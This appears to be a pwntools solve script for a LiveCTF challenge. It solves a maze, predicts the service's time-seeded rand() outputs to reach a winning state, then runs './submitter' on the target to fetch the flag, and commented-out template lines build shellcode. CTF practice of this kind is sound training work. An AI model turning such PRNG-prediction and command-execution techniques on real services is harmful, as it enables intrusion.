#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ../handout/challenge --host localhost --port 31337
from pwn import *
from collections import deque

def solve_maze(maze):
    # Find the starting position and goal position
    start_pos = None
    goal_pos = None
    for i, row in enumerate(maze):
        if '@' in row:
            start_pos = (i, row.index('@'))
        if '*' in row:
            goal_pos = (i, row.index('*'))
        if start_pos and goal_pos:
            break
    
    # Define the possible moves
    moves = [(0, 1), (0, -1), (1, 0), (-1, 0)]
    
    # Initialize the queue with the starting position
    queue = deque([(start_pos, [])])
    
    # Keep track of visited positions
    visited = set([start_pos])
    
    # Breadth-first search algorithm
    while queue:
        pos, path = queue.popleft()
        if pos == goal_pos:
            return path + [pos]
        for move in moves:
            new_pos = (pos[0] + move[0], pos[1] + move[1])
            if new_pos[0] < 0 or new_pos[0] >= len(maze) or new_pos[1] < 0 or new_pos[1] >= len(maze[0]):
                continue
            if maze[new_pos[0]][new_pos[1]] == '#' or new_pos in visited:
                continue
            queue.append((new_pos, path + [pos]))
            visited.add(new_pos)
    
    # If no path is found, return None
    return None

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or os.environ.get('HOST', 'localhost')
port = int(args.PORT or 31337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

from ctypes import CDLL
from ctypes.util import find_library

libc = find_library("c")
libc = CDLL(libc)
libc.srand(libc.time(0))

def do_option(opt):
    io.sendlineafter(b"torment:", opt)

#exploit goes here


do_option(b"a")
io.recvline_contains(b"eye above the maze.")
maze_lines = []

start_pos = (1, 1)
end_pos = (0, 0)
for i in range(29):
    maze_line = io.recvline().decode().strip()
    for j in range(29):
        if maze_line[j] == "*":
            end_pos = (i, j)
    maze_lines.append(maze_line)

print(maze_lines)

solve = solve_maze(maze_lines)


log.info("end pos = %s", end_pos)
log.info("solved = %s", solve)

addv = lambda a,b:(a[0]+b[0],a[1]+b[1])
subv = lambda a,b:(a[0]-b[0],a[1]-b[1])
DIR = {(1,0):"s",(-1,0):"n",(0,1):"e",(0,-1):"w"}
Q = {(1,1)}
prev = {(1,1):None}
tgt = None
maze = maze_lines
for i in range(len(maze)):
    for j in range(len(maze[i])):
        if maze[i][j] == "*":
            tgt = (i,j)

while Q:
    c = Q.pop()
    for d in DIR:
        cn = addv(c,d)
        if not (0 <= cn[0] < len(maze) and 0 <= cn[1] < len(maze[0])):
            continue
        if maze[cn[0]][cn[1]] == "#":
            continue
        if cn in prev:
            continue
        prev[cn] = c
        Q.add(cn)
    if tgt in prev:
        break            

assert tgt in prev, prev
path = ""
cur = tgt
while True:
    next = prev[cur]
    if next is None:
        break
    d = subv(cur, next)
    path += DIR[d]
    cur = next
path = path[::-1]


v2 = [""]*4
v2[0] = "cozy"
v2[1] = "medium-sized"
v2[2] = "spacious"
v2[3] = "massive"

v3 = [""]*16
v3[0] = "bookshelves"
v3[1] = "fireplaces"
v3[2] = "suits of armor"
v3[3] = "tables"
v3[4] = "chests"
v3[5] = "beds"
v3[6] = "paintings"
v3[7] = "statues"
v3[8] = "tapestries"
v3[9] = "candelabras"
v3[10] = "chairs"
v3[11] = "fountains"
v3[12] = "mirrors"
v3[13] = "rugs"
v3[14] = "curtains"
v3[15] = "chess sets"

v4 = [""]*16
v4[0] = "Art Deco"
v4[1] = "Baroque"
v4[2] = "Classical"
v4[3] = "Colonial"
v4[4] = "Contemporary"
v4[5] = "Country"
v4[6] = "Gothic"
v4[7] = "Industrial"
v4[8] = "Mediterranean"
v4[9] = "Minimalist"
v4[10] = "Neoclassical"
v4[11] = "Renaissance"
v4[12] = "Rococo"
v4[13] = "Romantic"
v4[14] = "Rustic"
v4[15] = "Victorian"

def get_rand(response):
    rand_val = 0
    v2_part = re.search(r'standing in a (.+) space', response).group(1)
    v2_idx = v2.index(v2_part)
    rand_val = v2_idx
    v3_part = re.search(r'adorned with (.+) and a two large', response).group(1)
    print(v3_part)
    v3_idx = v3.index(v3_part)
    rand_val |= v3_idx << 2
    v3_part = re.search(r'and a two large (.+) dominate', response).group(1)
    v3_idx = v3.index(v3_part)
    rand_val |= v3_idx << 6
    flowers_part = int(re.search(r'You see (.+) flowers', response).group(1))
    rand_val |= flowers_part << 14
    stars_part = int(re.search(r'stop to count (.+) stars', response).group(1))
    rand_val |= stars_part << 14
    v4_part = re.search(r'designed in the (.+) style.', response).group(1)
    v4_idx = v4.index(v4_part)
    rand_val |= v4_idx << 10
    return rand_val

steps = []
for i in path[:-1]:
    io.sendline(i)
    io.recvuntil(b"As you")
    steps.append(get_rand(io.recvline().decode()))


pred = []
for _ in range(len(steps)):
    pred.append(libc.rand())
while pred != steps:
    pred = pred[1:] + [libc.rand()]

num_times_to_stall = 0
while libc.rand() % 1213 != 1212:
    num_times_to_stall += 1

for i in range(num_times_to_stall):
    io.sendline(b"l")

io.sendline(path[-1])

#io.interactive()



io.recvline_contains(b"solved the")
io.sendline(b"./submitter")
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

# io.interactive()

